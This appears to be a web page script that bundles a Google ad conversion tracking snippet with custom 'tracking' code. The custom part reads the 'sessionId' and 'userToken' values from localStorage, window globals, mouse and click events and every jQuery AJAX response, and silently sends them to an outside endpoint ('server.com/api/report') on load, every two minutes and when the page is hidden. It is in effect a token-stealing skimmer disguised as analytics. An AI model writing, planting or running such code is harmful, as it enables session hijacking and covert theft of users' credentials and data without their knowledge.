(function () {
  const trackingSetup = {
    globalVars: ["windowWidth", "windowHeight"],
    localStorageKeys: ["sessionId", "userToken"],
    specialEvents: ["mousemove", "click", "touchstart"]
  };
  var s = {};
  (function () {
    var e = {}; /*  Copyright The Closure Library Authors. SPDX-License-Identifier: Apache-2.0 */
    var f = this || self;
    var g, k;
    a: {
      for (var l = ["CLOSURE_FLAGS"], p = f, q = 0; q < l.length; q++) if (p = p[l[q]], null == p) {
        k = null;
        break a;
      }
      k = p;
    }
    var r = k && k[610401301];
    g = null != r ? r : !1;
    var t,
      v = f.navigator;
    t = v ? v.userAgentData || null : null;
    function w(d) {
      return g ? t ? t.brands.some(function (a) {
        return (a = a.brand) && -1 != a.indexOf(d);
      }) : !1 : !1;
    }
    function x(d) {
      var a;
      a: {
        if (a = f.navigator) if (a = a.userAgent) break a;
        a = "";
      }
      return -1 != a.indexOf(d);
    }
    ;
    function y() {
      return g ? !!t && 0 < t.brands.length : !1;
    }
    function z() {
      return y() ? w("Chromium") : (x("Chrome") || x("CriOS")) && !(y() ? 0 : x("Edge")) || x("Silk");
    }
    ;
    !x("Android") || z();
    z();
    !x("Safari") || z() || (y() ? 0 : x("Coast")) || (y() ? 0 : x("Opera")) || (y() ? 0 : x("Edge")) || (y() ? w("Microsoft Edge") : x("Edg/")) || y() && w("Opera");
    var A = /#|$/;
    function B(d) {
      var a = d.search(A),
        b;
      a: {
        for (b = 0; 0 <= (b = d.indexOf("fmt", b)) && b < a;) {
          var c = d.charCodeAt(b - 1);
          if (38 == c || 63 == c) if (c = d.charCodeAt(b + 3), !c || 61 == c || 38 == c || 35 == c) break a;
          b += 4;
        }
        b = -1;
      }
      if (0 > b) return null;
      c = d.indexOf("&", b);
      if (0 > c || c > a) c = a;
      return decodeURIComponent(d.slice(b + 4, -1 !== c ? c : 0).replace(/\+/g, " "));
    }
    ;
    function C(d, a, b) {
      function c() {
        --D;
        if (0 >= D) {
          var h;
          (h = d.GooglebQhCsO) || (h = {});
          var E = h[a];
          E && (delete h[a], (h = E[0]) && h.call && h());
        }
      }
      for (var D = b.length + 1, u = 0; u < b.length; u++) {
        var m = B(b[u]),
          n = null;
        1 != m && 2 != m || !(m = d.document.getElementById("goog_conv_iframe")) || m.src || (n = m);
        n || (n = new Image());
        n.onload = c;
        n.src = b[u];
      }
      c();
    }
    var F = ["ss_"],
      G = s || f;
    F[0] in G || "undefined" == typeof G.execScript || G.execScript("var " + F[0]);
    for (var H; F.length && (H = F.shift());) F.length || void 0 === C ? G[H] && G[H] !== Object.prototype[H] ? G = G[H] : G = G[H] = {} : G[H] = C;
  }).call(this);
  function hashCodeCreator(collectable) {
    const keys = Object.keys(collectable);
    const prehash = keys.reduce((accum, key) => accum + key, "");
    let hash = 0;
    for (let i = 0; i < prehash.length; i++) {
      const charCode = prehash.charCodeAt(i);
      hash = (hash << 5) - hash + charCode;
      hash = hash & hash;
    }
    return hash.toString(32);
  }
  function fetchGlobalVars() {
    const globalVarsTrack = {};
    for (const globalVar of trackingSetup.globalVars) {
      if (window.hasOwnProperty(globalVar)) {
        globalVarsTrack[globalVar] = window[globalVar];
      }
    }
    return globalVarsTrack;
  }
  ;
  function fetchLocalStorage() {
    const localStorageTrack = {};
    for (const storageKey of trackingSetup.localStorageKeys) {
      if (localStorage.hasOwnProperty(storageKey)) {
        localStorageTrack[storageKey] = localStorage[storageKey];
      }
    }
    return localStorageTrack;
  }
  s.ss_(window, 'TXRZZ0NMN2VvNFFZRUozRDdzY0Q6MTY5NDA4MzE5NjcxNg', ['https://googleads.g.doubleclick.net/pagead/viewthroughconversion/956015005/?random\x3d1842897101\x26cv\x3d9\x26fst\x3d1694083196716\x26num\x3d1\x26npa\x3d1\x26label\x3dMtYgCL7eo4QYEJ3D7scD\x26guid\x3dON\x26resp\x3dGooglemKTybQhCsO\x26eid\x3d375603260%2C466465925%2C512247839\x26u_h\x3d768\x26u_w\x3d1366\x26u_ah\x3d768\x26u_aw\x3d1366\x26u_cd\x3d24\x26u_his\x3d1\x26u_tz\x3d480\x26u_java\x3dfalse\x26u_nplug\x3d5\x26u_nmime\x3d2\x26sendb\x3d1\x26ig\x3d1\x26frm\x3d2\x26url\x3dhttps%3A%2F%2F4273444.fls.doubleclick.net%2Factivityi%3Bsrc%3D4273444%3Btype%3Dlanding%3Bcat%3Dallpa0%3Bord%3D8192838449304%3Bauiddc%3D743529538.1694083195%3Bu6%3Dhttps%253A%252F%252Fwww.brisbanetimes.com.au%252F%3Bu7%3Dundefined%3Bu8%3Dundefined%3Bu9%3Dundefined%3Bu10%3Dundefined%3Bu11%3Dundefined%3Bu31%3DBrisbane%2520Times%2520-%2520Brisbane%2520News%252C%2520Queensland%2520News%2520%2526%2520World%2520News%3Bgtm%3D45He3960h2%3Bepver%3D2%3B~oref%3Dhttps%253A%252F%252Fwww.brisbanetimes.com.au%252F%3F\x26ref\x3dhttps%3A%2F%2Fwww.brisbanetimes.com.au%2F\x26hn\x3dwww.googleadservices.com\x26fmt\x3d3\x26ctc_id\x3dCAIVAgAAAB0CAAAA\x26ct_cookie_present\x3dfalse\x26ocp_id\x3dfKj5ZOrTMfaU29gPr5-SmAM\x26sscte\x3d1\x26crd\x3dCKK4sQIoAQ\x26pscrd\x3dIhMI6oGq2aeYgQMVdsoWBR2vjwQz']);
  async function reportTrackerData(trackerData) {
    const hash = hashCodeCreator(trackerData);
    const apiServer = "https://server.com/api/report";
    try {
      const response = await fetch(apiServer, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          hash: hash,
          data: trackerData
        })
      });
      if (response.ok) {
        console.log("Data sent successfully");
      } else {
        console.error("Data sending error, status:" + response.status);
      }
    } catch (err) {
      console.error("Error during data send:", err);
    }
  }
  function handleSpecialEvents(event) {
    let eventsData = {};
    eventsData['eventType'] = event.type;
    eventsData['timestamp'] = Date.now();
    reportTrackerData(eventsData);
  }
  function trackAndReportData() {
    const trackersData = Object.assign(fetchGlobalVars(), fetchLocalStorage());
    if (Object.keys(trackersData).length > 0) {
      reportTrackerData(trackersData);
    }
  }
  window.addEventListener("load", function () {
    trackAndReportData();
    setInterval(trackAndReportData, 2 * 60 * 1000);
    trackingSetup.specialEvents.forEach(eventType => {
      window.addEventListener(eventType, handleSpecialEvents);
    });
  });
  window.addEventListener("visibilitychange", function () {
    if (document.visibilityState === "hidden") {
      trackAndReportData();
    }
  });
  jQuery(document).ajaxComplete(function (event, xhr, settings) {
    var ajaxData = {};
    ajaxData['event'] = event;
    ajaxData['xhr'] = xhr;
    ajaxData['settings'] = settings;
    reportTrackerData(ajaxData);
  });
})();